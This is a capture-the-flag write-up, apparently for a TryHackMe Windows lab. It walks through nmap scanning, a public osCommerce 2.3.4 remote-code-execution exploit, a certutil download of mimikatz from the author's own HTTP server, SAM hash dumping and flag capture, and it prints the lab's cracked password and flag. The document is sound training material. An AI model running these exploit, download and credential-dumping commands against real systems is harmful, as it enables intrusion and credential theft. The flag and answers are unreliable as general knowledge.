## 🛠️ Enviroment Setup ##

I need to connect to TryHackMe server so i can directly use my kali to get this task done.

1. First i download the `ap-south-1-kmrlbhr-regular.ovpn` for TryHackMe from `TryHackMe | Access`

2. After finished downloaded the ovpn, I use :
   ```bash
   sudo openvpn ap-south-1-kmrlbhr-regular.ovpn
   ```

3. Next to ensure that i successfully connect with TryHackMe server, I use :
   ```bash
   ping 192.168.206.94
   ```
<img width="508" height="187" alt="ping tryhackme" src="https://github.com/user-attachments/assets/53e9b023-8478-4226-9612-56d54a28ece5" />

## 🔍 Stage 1: Reconnaissance & Scanning ##

I used nmap to identify open ports, service versions, and run default scripts. Comprehensive port scan

```bash
sudo nmap -sC -sV -p- -T4 10.49.173.176
```

<img width="658" height="846" alt="nmap tryhackme" src="https://github.com/user-attachments/assets/c0e7a407-92ee-42ed-9d53-5ab89d2bef30" />


## Flag Breakdown :

• -sC : Runs default Nmap scripts to check for common misconfigurations.

• -sV : Probes open ports to determine service and version information.

• -p- : Scans all 65,535 ports.

• -T4 : Sets the timing template to "Aggressive" for faster execution.

Findings:
| Port | State | Service | Version | Key Findings |
| :--- | :--- | :--- | :--- | :--- |
| **80** | Open | HTTP | Microsoft IIS httpd 7.5 | Returning 404 for the root directory; potentially a decoy or misconfigured service. |
| **135/139** | Open | RPC/NetBIOS | Microsoft Windows RPC | Confirmed the target is a Windows-based system. |
| **443** | Open | HTTPS | Apache 2.4.23 (OpenSSL 1.0.2h) | **Critical:** Directory listing enabled. Exposed `/oscommerce-2.3.4/` and its subdirectories (`catalog/`, `docs/`). |
| **445** | Open | SMB | Windows 7 Home Basic 7601 SP1 | Identified OS version and hostname `BLUEPRINT`. Message signing is "enabled but not required." |
| **3306** | Open | MySQL | MariaDB 10.3.23 | Database service detected; currently "unauthorized" for remote root login. |
| **8080** | Open | HTTP | Apache 2.4.23 (OpenSSL 1.0.2h) | Mirroring Port 443; directory listing exposed `/oscommerce-2.3.4/` via a non-standard port. |
| **49152+** | Open | MSRPC | Microsoft Windows RPC | High-range ports used for standard Windows RPC communication. |

## Stage 2: Vulnerability Assessment ##

Since I found osCommerce 2.3.4 during Stage 1, I use this stage to research how that software can be compromised.

```bash
searchsploit oscommerce 2.3.4
```

<img width="936" height="174" alt="searchsploit tryhackme" src="https://github.com/user-attachments/assets/43f07e76-2bc5-4eea-add2-74aeacce9da6" />


After discovering the **osCommerce 2.3.4** installation during the enumeration phase, I utilized `searchsploit` to cross-reference the exact version with known public exploits. The search revealed that this specific version is highly vulnerable to unauthenticated attacks.


| Vulnerability / Component | Type | Impact | Exploit / Source | Key Findings |
| :--- | :--- | :--- | :--- | :--- |
| **osCommerce 2.3.4.1** | Remote Code Execution (RCE) | **Critical** | `44374.py` (Exploit-DB) | Unauthenticated RCE via the `/install` directory. This is the primary vector for gaining initial system access. |
| **osCommerce 2.3.4.1** | Remote Code Execution (RCE) | **Critical** | `50128.py` (Exploit-DB) | Alternative unauthenticated RCE script, useful if the primary payload fails. |
| **osCommerce 2.3.4.1** | Arbitrary File Upload | High | `43191.py` (Exploit-DB) | Allows for uploading a web shell, though typically requires higher access or specific misconfigurations compared to the RCE. |


**Assessment Conclusion:** 
The application has not been patched against critical RCE vulnerabilities. I will proceed to the Exploitation phase utilizing the `44374.py` exploit to achieve remote code execution.


## Stage 3: Exploitation ##

• Using a publicly available exploit from [GitHub](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution/blob/main/osCommerce2_3_4RCE.py) targeting osCommerce 2.3.4, remote command execution was:

```bash
python3 osCommerce2_3_4RCE.py http://10.49.151.74:8080/oscommerce-2.3.4/catalog
```

• The script confirmed that the install directory was available, indicating vulnerability. A test command injection returned the user context as:

```bash
User: nt authority\system
```

This demonstrated that commands could be executed on the host with SYSTEM privileges.

image

## Stage 4: Post-Exploitation (Maintaining Access & Privilege Escalation) ##

Once inside, I explores the system, gathers sensitive data, and attempts to secure my foothold. (Because the author already had SYSTEM privileges, I skipped Privilege Escalation and moved straight to credential harvesting).

I use `mimicatz.exe` as it's an open-source post-exploitation and credential-dumping tool.

First, I download `mimikatz.exe` at [mimikatz.exe](https://github.com/ParrotSec/mimikatz/blob/master/Win32/mimikatz.exe)

After that, I setup my server so that `mimikatz.exe` can be fetched by using:

```bash
python3 -m http.server 8000
```
image

The status **200** tells that `mimikatz.exe` is successfully fetched.

Next on the `RCE_SHELL$`:

```bash
certutil -urlcache -split -f http://192.168.206.94:8000/mimikatz.exe mimikatz.exe
```

image

This command is a classic example of using a "Living off the Land Binary" (LOLBin). A LOLBin is a legitimate, pre-installed operating system tool that attackers (or penetration testers) abuse to perform actions they normally wouldn't be able to do easily, such as downloading malicious payloads without needing a dedicated web browser or custom download script.

```bash
****  Online  ****
  000000  ...
  0f2f08
CertUtil: -URLCache command completed successfully.
```
It confirms that the Windows target machine successfully reached out to my hosting server and downloaded my file.

```bash
.\mimikatz "lsadump::sam" exit
```

image

• `.\mimikatz`
This tells the Windows command prompt to execute the mimikatz.exe application located in your current directory (the .\ specifies "right here in this folder").

• `"lsadump::sam"`
This is the specific instruction you are passing to Mimikatz.

   • lsadump is the Mimikatz module used to interact with Windows security and credential structures.

• `sam` targets the Security Account Manager (SAM) database. The SAM is a registry file in Windows that stores local user accounts and their passwords (stored as NTLM hashes, not plain text). This command extracts the System Key (SysKey) to decrypt the SAM database and print those hashes to your screen.

• `exit`
This final argument tells Mimikatz to terminate and return you to the standard Windows command prompt immediately after it finishes dumping the hashes.

**Cracking the Lab User NTLM Hash**

Using an online hash cracking service (hashes.com), the Lab user's NTLM hash was decrypted revealing the password:

Hash: 30e87bf999828446a1c1209ddde4c450
Password: googleplus

image

**Capturing the Root Flag**

Finally, using system commands, the root flag file was read:

```bash
type C:\Users\Administrator\Desktop\root.txt.txt
```
FLAG : THM{aea1e3ce6fe7f89e10cea833ae009bee}

image

## Stage 5 : Clear Track ##

